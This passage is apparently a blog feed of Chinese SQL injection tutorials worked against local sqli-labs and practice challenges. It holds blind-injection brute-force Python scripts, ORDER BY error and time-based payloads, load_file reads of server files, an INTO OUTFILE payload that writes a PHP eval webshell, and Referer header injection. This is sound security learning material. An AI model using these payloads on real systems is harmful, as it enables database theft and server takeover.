alt=\"image-20221002230320006\"></p>\n<p>我们看到<code>返回包里有个Hint</code>，由于格式是<code>大小写</code>+<code>数字</code>+<code>==</code>，我们解码<code>Base64</code></p>\n<p><img src=\"image-20221002225334319.png\" alt=\"image-20221002225334319\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$query=&quot;SELECT * FROM admin WHERE uname=&#x27;&quot;.$uname.&quot;&#x27;&quot;;if ($row[&#x27;passwd&#x27;]===$passwd)&#123;$_SESSION[&#x27;flag&#x27;] = 1;</span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过方式-3\"><a href=\"#绕过方式-3\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h3><p>也就是说，<strong>uname是用单引号包裹</strong>，所以我们可以用<strong>单引号去闭合</strong>——</p>\n<p>使用<code>&#39; = 1 = &#39;</code>绕过：因为<code>uname=&#39;&#39; = 1</code>为假，<code>假 = &#39;&#39;</code>为真</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#原理核心，和 &#x27; or 1 or &#x27; 异曲同工</span><br><span class=\"line\">uname=&#x27;= (1) =&#x27;&amp;passwd=admin</span><br><span class=\"line\"></span><br><span class=\"line\">#那么就可以有如下注入点：</span><br><span class=\"line\">uname=&#x27;= (select(1)from(admin)where(length(passwd)=32)) =&#x27;&amp;passwd=admin</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002221112034.png\" alt=\"image-20221002221112034\"></p>\n<p>确定了长度，尝试考虑使用脚本爆破</p>\n<p>关键核心语句为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">uname=  &#x27;= (select(1)from(admin)where(substr((passwd)from(32))=&#x27;f&#x27;)) =&#x27;</span><br><span class=\"line\">#其中，32需要遍历，&#x27;f&#x27;也需要遍历</span><br><span class=\"line\">#注意，由于使用了substr + from的方式，因此需要&quot;从后向前&quot;盲推字符</span><br></pre></td></tr></table></figure>\n<p>附上脚本：</p>\n<p><code>注意</code>：post请求中，如果参数是”uname=xxxx &amp; passwd=yyyy”这样的，我们需要在python脚本中建立一个字典去匹配。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">&#x27;password error!!@_@&#x27;</span></span><br><span class=\"line\">words = <span class=\"string\">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/SQLC/sql-9/login.php&quot;</span></span><br><span class=\"line\">payload = &#123;<span class=\"string\">&quot;uname&quot;</span>: <span class=\"string\">&quot;&quot;</span>, <span class=\"string\">&quot;passwd&quot;</span>:<span class=\"string\">&quot;&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tflag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\ttemp = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">33</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">            <span class=\"comment\">#flag:c12366feb7373bf6d869ab7d581215cf</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#first reverse cf-&gt;fc</span></span><br><span class=\"line\">\t\t\ttemp = temp + j   <span class=\"comment\">#fcg</span></span><br><span class=\"line\">\t\t\ttemp = temp[::-<span class=\"number\">1</span>] <span class=\"comment\">#second reverse gcf</span></span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;uname&#x27;</span>] = <span class=\"string\">&quot;&#x27;= (select(1)from(admin)where(substr((passwd)from(&#123;&#125;))=&#x27;&#123;&#125;&#x27;)) =&#x27;&quot;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">33</span>-i),temp)</span><br><span class=\"line\">\t\t\tpayload[<span class=\"string\">&#x27;passwd&#x27;</span>] = <span class=\"string\">&quot;admin&quot;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(payload)</span></span><br><span class=\"line\">\t\t\tresponse = requests.post(url, data = payload)</span><br><span class=\"line\">\t\t\t<span class=\"comment\">#print(response.text)</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> response.text:</span><br><span class=\"line\">\t\t\t\tflag = temp</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;++++&quot;</span>,flag)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">#if not found</span></span><br><span class=\"line\">\t\t\ttemp = flag</span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;the flag is:&quot;</span>,flag)</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p>格式为<code>小写</code>+<code>数字</code>，属于<code>md5</code>加密格式</p>\n<p>那么就有www.cmd5.com</p>\n<p><img src=\"image-20221002231016796.png\" alt=\"image-20221002231016796\"></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/OrderBy%E6%B3%A8%E5%85%A5/",
            "title": "OrderBy注入",
            "date_published": "2022-10-02T04:59:34.000Z",
            "content_html": "<h1 id=\"有趣的Order-by注入\"><a href=\"#有趣的Order-by注入\" class=\"headerlink\" title=\"有趣的Order by注入\"></a>有趣的Order by注入</h1><p>下面介绍几个从ThreeZh1师傅那里学到的几个有趣的SQL注入</p>\n<h2 id=\"常规Order-by注入\"><a href=\"#常规Order-by注入\" class=\"headerlink\" title=\"常规Order by注入\"></a>常规Order by注入</h2><p>先来看一下Order by注入的原理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT username, password FROM users order by 1 asc;</span><br></pre></td></tr></table></figure>\n<p>这是一个常见的order by使用语句，order by后面的数字1是第1个列的意思(<strong>也可以指定列名</strong>)，<code>asc</code>/ <code>desc</code>指定是升序还是降序。</p>\n<p><code>注意</code>：在order by后面的不会根据计算的结果来排序。</p>\n<p>这里有以下几种方式来进行测试：</p>\n<h3 id=\"order-by-报错注入\"><a href=\"#order-by-报错注入\" class=\"headerlink\" title=\"order by + 报错注入\"></a>order by + 报错注入</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-布尔盲注\"><a href=\"#order-by-布尔盲注\" class=\"headerlink\" title=\"order by  + 布尔盲注\"></a>order by  + 布尔盲注</h3><p>rand()会返回一个0和1之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。</p>\n<p>这里就可以用mid（也就是substr函数）来构造布尔盲注的方式来进行注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by rand(mid(version(),1,1)=5)</span><br></pre></td></tr></table></figure>\n<h3 id=\"order-by-gt-0的数-and-时间盲注方式\"><a href=\"#order-by-gt-0的数-and-时间盲注方式\" class=\"headerlink\" title=\"order by + (&gt;0的数) +and+时间盲注方式\"></a>order by + (&gt;0的数) +and+时间盲注方式</h3><p>在order by后面的不会根据计算的结果来排序，但是计算还是会运行。</p>\n<p>也就是，当我们的payload有延迟命令的时候，页面还是会延迟的。</p>\n<p>使用and连接时间盲注payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))</span><br></pre></td></tr></table></figure>\n<p>这里用<code>sqllib-Less46</code>作为一个学习的例子：</p>\n<p>它的源代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$id=$_GET[&#x27;sort&#x27;];</span><br><span class=\"line\">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115154304.png\" alt=\"image-20221002115154304\"></p>\n<p>那么可以<code>将这个1替换成查询语句</code>，因为<code>查询成功</code>的结果就是<code>返回1</code></p>\n<p><code>注意</code>：如果对上述这一句有疑问，请看下图</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = (select 2)</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120406540.png\" alt=\"image-20221002120406540\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120420706.png\" alt=\"image-20221002120420706\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sort = 2</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002120434503.png\" alt=\"image-20221002120434503\"></p>\n<p>OK，那就可以有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115341706.png\" alt=\"image-20221002115341706\"></p>\n<p>读表：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))</span><br><span class=\"line\"></span><br><span class=\"line\">#与下面一句等效</span><br><span class=\"line\">http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002115558719.png\" alt=\"image-20221002115558719\"></p>\n<h2 id=\"另外一种Order-by-注入\"><a href=\"#另外一种Order-by-注入\" class=\"headerlink\" title=\"另外一种Order by 注入\"></a>另外一种Order by 注入</h2><p>ThreeZh1自己写了一个题来学习这一种order by注入。</p>\n<p>题目过滤了F1g3这个字段名。<code>在id=3时</code>，F1g3字段存在flag的base16编码。(直接过滤Flag会更好)</p>\n<p>查询语句：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &quot;.$id.&quot;;&quot;;</span><br></pre></td></tr></table></figure>\n<p>已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为2</p>\n<p>因为过滤了F1ag这个字段名，我们不能直接用普通盲注的方式得到F1ag，所以就得使用一种特别的order by盲注。</p>\n<p><img src=\"image-20221002120830210.png\" alt=\"image-20221002120830210\"></p>\n<h3 id=\"尝试报错\"><a href=\"#尝试报错\" class=\"headerlink\" title=\"尝试报错\"></a>尝试报错</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p>这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入</p>\n<p><img src=\"image-20221002120931642.png\" alt=\"image-20221002120931642\"></p>\n<h3 id=\"尝试不报错\"><a href=\"#尝试不报错\" class=\"headerlink\" title=\"尝试不报错\"></a>尝试不报错</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 #</span><br><span class=\"line\">不报错</span><br></pre></td></tr></table></figure>\n<h3 id=\"尝试获取列数\"><a href=\"#尝试获取列数\" class=\"headerlink\" title=\"尝试获取列数\"></a>尝试获取列数</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 3 #</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by 4 #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>获取列数为3</p>\n<h3 id=\"尝试获取数据库版本\"><a href=\"#尝试获取数据库版本\" class=\"headerlink\" title=\"尝试获取数据库版本\"></a>尝试获取数据库版本</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #</span><br><span class=\"line\">id: 1 name: oops,This is not the flag id </span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>既然，直接报错注入的方式不可行，那么我们换一种思路，用order by</p>\n<p>可以直接用order by 么？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #</span><br><span class=\"line\">???报错</span><br></pre></td></tr></table></figure>\n<p>服，那就尝试先来排序。由于id=1、id=2时，都不是flag所对应的id，根据题目，我们知道flag在id=3所在行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">id=3 union select 1,2,3 order by 1</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">id=3 union select 4,2,3 order by 1</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 4 name: 3 </span><br></pre></td></tr></table></figure>\n<p>根据这个差异，我们可以指定<code>按第二列</code>来排序，并在select里猜测flag的首字符值。这样就可以不使用F1ag这个字段名就把值读出来。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;6&#x27;,3 order by 2</span><br><span class=\"line\">id: 1 name: 3 </span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/threezh1/index.php?id=3 union select 1,&#x27;7&#x27;,3 order by 2</span><br><span class=\"line\">id: 3 name: threezh1 </span><br><span class=\"line\">id: 1 name: 3 </span><br></pre></td></tr></table></figure>\n<p>出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以flag的第一个字符为’6’。</p>\n<p>按照这个思路，写出脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">key = <span class=\"string\">&quot;&lt;tr&gt;&lt;td&gt; id: 3 &lt;/td&gt; &lt;td&gt; name: threezh1 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt; id: 1 &lt;/td&gt; &lt;td&gt; name: 3 &lt;/td&gt; &lt;br/&gt;&lt;/tr&gt;&quot;</span></span><br><span class=\"line\">url = <span class=\"string\">&quot;http://127.0.0.1/threezh1/index.php?&quot;</span></span><br><span class=\"line\">words = <span class=\"string\">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">target_flag</span>():</span><br><span class=\"line\">\tlength = <span class=\"number\">0</span></span><br><span class=\"line\">\tflag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\t\tpayload = <span class=\"string\">&quot;id=3 union select 1,&#x27;&#123;0&#125;&#x27;,3 order by 2&quot;</span>.<span class=\"built_in\">format</span>(flag + j)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">\t\t\tcontent = requests.get(url + payload)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> key <span class=\"keyword\">in</span> content.text:</span><br><span class=\"line\">\t\t\t\tflag = flag + temp <span class=\"comment\">#使用上一次保存的字符添加到flag的尾部</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#print(flag)</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\ttemp = j <span class=\"comment\">#保存这一次的&quot;没有令回包出现变化&quot;的字符（temp保证是最新的字符）</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> j == <span class=\"string\">&#x27;Z&#x27;</span>:</span><br><span class=\"line\">\t\t\tlength = i-<span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;flag is:&quot;</span>,flag,<span class=\"string\">&quot;length is:&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\">target_flag()</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002124705182.png\" alt=\"image-20221002124705182\"></p>\n<p>附上源码查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;6&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>1-6都是这个样子</p>\n<p><img src=\"image-20221002125810127.png\" alt=\"image-20221002125810127\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&#x27;7&#x27;,3 order by 2</span><br></pre></td></tr></table></figure>\n<p>到7的时候第一次变化</p>\n<p><img src=\"image-20221002125748813.png\" alt=\"image-20221002125748813\"></p>\n<p>所以就是要记录何时第一次变化，然后把<code>上一次没有引起回包变化的字符</code>添加到<strong>flag的尾部</strong></p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "url": "https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/",
            "title": "SQL注入读写文件",
            "date_published": "2022-10-01T16:29:51.000Z",
            "content_html": "<h1 id=\"SQL注入之SQL注入读写文件\"><a href=\"#SQL注入之SQL注入读写文件\" class=\"headerlink\" title=\"SQL注入之SQL注入读写文件\"></a>SQL注入之SQL注入读写文件</h1><p>本篇讲解SQL注入读写文件</p>\n<p>使用到的函数如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</span><br><span class=\"line\">使用条件：</span><br><span class=\"line\">A、必须有权限读取并且文件必须完全可读</span><br><span class=\"line\">B、欲读取文件必须在服务器上</span><br><span class=\"line\">C、必须指定文件完整的路径</span><br><span class=\"line\">D、欲读取文件必须小于 max_allowed_packet</span><br></pre></td></tr></table></figure>\n<p>Less-1为例</p>\n<h2 id=\"尝试报错\"><a href=\"#尝试报错\" class=\"headerlink\" title=\"尝试报错\"></a>尝试报错</h2><p>添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005100344.png\" alt=\"image-20221002005100344\"></p>\n<h2 id=\"尝试不报错\"><a href=\"#尝试不报错\" class=\"headerlink\" title=\"尝试不报错\"></a>尝试不报错</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005148813.png\" alt=\"image-20221002005148813\"></p>\n<h2 id=\"尝试order-by注入\"><a href=\"#尝试order-by注入\" class=\"headerlink\" title=\"尝试order by注入\"></a>尝试order by注入</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=1&#x27; order by 4 %23</span><br><span class=\"line\">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>\n<h2 id=\"读取文件\"><a href=\"#读取文件\" class=\"headerlink\" title=\"读取文件\"></a>读取文件</h2><p>一般获取服务器的绝对路径有两种方法：</p>\n<ul>\n<li>通过经验猜测和自己搭建的服务器同样的路径</li>\n<li>通过爆破手段得到</li>\n</ul>\n<p>这里就演示一下本地服务器绝对路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005701120.png\" alt=\"image-20221002005701120\"></p>\n<p>显示比较混乱，原因是当读取到index.php之后返回给页面的是php语句，所以在页面显示的时候被php重复解析。</p>\n<p>我们转换Hex存储</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-1/?id=-11&#x27; union select 1, 2, Hex(load_file(&quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-1\\\\index.php&quot;)) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002005946274.png\" alt=\"image-20221002005946274\"></p>\n<p>接下来去BurpSuit，或者在线网站转码。这里选择<strong>BurpSuit</strong>，选择<code>Decoder-Decode as.....-Ascii hex</code></p>\n<p><img src=\"image-20221002010101190.png\" alt=\"image-20221002010101190\"></p>\n<h2 id=\"写入文件\"><a href=\"#写入文件\" class=\"headerlink\" title=\"写入文件\"></a>写入文件</h2><p>写入文件使用函数为：into outfile</p>\n<p>例子为Less-7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002010552632.png\" alt=\"image-20221002010552632\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;</span><br><span class=\"line\">报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27; %23</span><br><span class=\"line\">报错，如果仅是单引号注入则这里不应该报错。所以根据经验尝试加个括号</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;) %23</span><br><span class=\"line\">报错，一个小括号不够？那就再加一个</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) %23</span><br><span class=\"line\">成功不报错</span><br></pre></td></tr></table></figure>\n<p>那么，使用order by确定列数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 3 %23</span><br><span class=\"line\">不报错</span><br><span class=\"line\"></span><br><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) order by 4 %23</span><br><span class=\"line\">You have an error in your SQL syntax，报错，所以只有三列</span><br></pre></td></tr></table></figure>\n<p>使用<code>into outflie</code>语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,3 into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.txt&quot; %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221002011103261.png\" alt=\"image-20221002011103261\"></p>\n<p>虽然报错，但是我们尝试去看一下<code>Less-7/aaa.txt</code>有没有生成</p>\n<p><img src=\"image-20221002011152149.png\" alt=\"image-20221002011152149\"></p>\n<p>写入成功。那么，既然可以写入文件，那就可以写入一句话木马。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/sqli/Less-7/?id=1&#x27;)) union select 1,2,&quot;&lt;?php @eval ($_POST[value]);?&gt;&quot; into outfile &quot;C:\\\\phpStudyB\\\\WWW\\\\sqli\\\\Less-7\\\\aaa.php&quot; %23</span><br></pre></td></tr></table></figure>\n<p>并成功解析成php执行。</p>\n<p>至此，SQL注入文件读写演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "url": "https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/HTTP-Referer%E6%B3%A8%E5%85%A5/",
            "title": "HTTP-Referer注入",
            "date_published": "2022-10-01T15:10:40.000Z",
            "content_html": "<h1 id=\"SQL注入之HTTP-Referer注入\"><a href=\"#SQL注入之HTTP-Referer注入\" class=\"headerlink\" title=\"SQL注入之HTTP-Referer注入\"></a>SQL注入之HTTP-Referer注入</h1><p>本篇讲解HTTP-Referer注入</p>\n<p>:::info</p>\n<p>HTTP-Referer注入</p>\n<p>:::</p>\n<p>在前几章的博客中，满篇都是对于基于select的注入手段。</p>\n<p>其实，对于数据库而言，像update、insert等命令都有可爆出数据库信息的点的。</p>\n<p>OK，开始做Less-19，送入<strong>Repeater</strong>。</p>\n<h2 id=\"尝试报错\"><a href=\"#尝试报错\" class=\"headerlink\" title=\"尝试报错\"></a>尝试报错</h2><p>在Referer后添加一个单引号：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;</span><br></pre></td></tr></table></figure>\n<p>结果报错</p>\n<p><img src=\"image-20221001235013114.png\" alt=\"image-20221001235013114\"></p>\n<h2 id=\"尝试不报错\"><a href=\"#尝试不报错\" class=\"headerlink\" title=\"尝试不报错\"></a>尝试不报错</h2><p>我们尝试通过加 双引号”、 #号及其变形（#、%23、—+）来看看能否不报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; #</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot; %23</span><br><span class=\"line\">ou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; %23&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span class=\"line\"></span><br><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27; --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot; --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br></pre></td></tr></table></figure>\n<p>后面还有个小括号，试试看是否需要闭合</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Referer: http://127.0.0.1/sqli/Less-19/&#x27;&quot;) --+</span><br><span class=\"line\">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;) --+&#x27;, &#x27;127.0.0.1&#x27;)&#x27; at line 1</span><br><span 